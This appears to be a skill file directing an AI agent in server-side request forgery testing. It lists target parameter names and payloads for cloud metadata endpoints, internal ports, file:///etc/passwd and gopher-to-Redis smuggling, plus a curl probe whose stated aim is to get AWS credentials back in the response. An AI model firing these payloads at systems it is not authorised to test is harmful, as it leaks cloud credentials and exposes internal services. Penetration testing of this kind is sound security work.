---
name: noir-ssrf
description: "Server-Side Request Forgery testing. Use when testing endpoints that accept URLs, file paths, or network resources. Trigger keywords: ssrf, server-side request forgery, internal network, metadata, localhost."
---

# SSRF Testing

## Goal
Identify endpoints vulnerable to Server-Side Request Forgery — where the application fetches resources from user-supplied URLs without proper validation.

## Targets

Look for parameters named: `url`, `file`, `path`, `redirect`, `src`, `href`, `link`, `load`, `fetch`, `callback`, `destination`, `return`, `next`.

## Payloads

### Cloud Metadata Endpoints

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://metadata.google.internal/
http://100.100.100.200/latest/meta-data/
```

### Internal Services

```
http://localhost:22/
http://localhost:3306/
http://localhost:6379/
http://127.0.0.1:8080/
http://0.0.0.0:9200/
```

### Protocol Smuggling

```
file:///etc/passwd
gopher://localhost:6379/_<redis-payload>
dict://localhost:8000/
```

## Detection

```bash
curl -s "<target>?url=http://169.254.169.254/latest/meta-data/"
```

Check response for:
- AWS credentials, security tokens
- Internal service banners
- File contents
- Response time differences (internal hosts may timeout)

## Output

Log: endpoint, parameter, payload, and evidence snippet (first 200 chars).
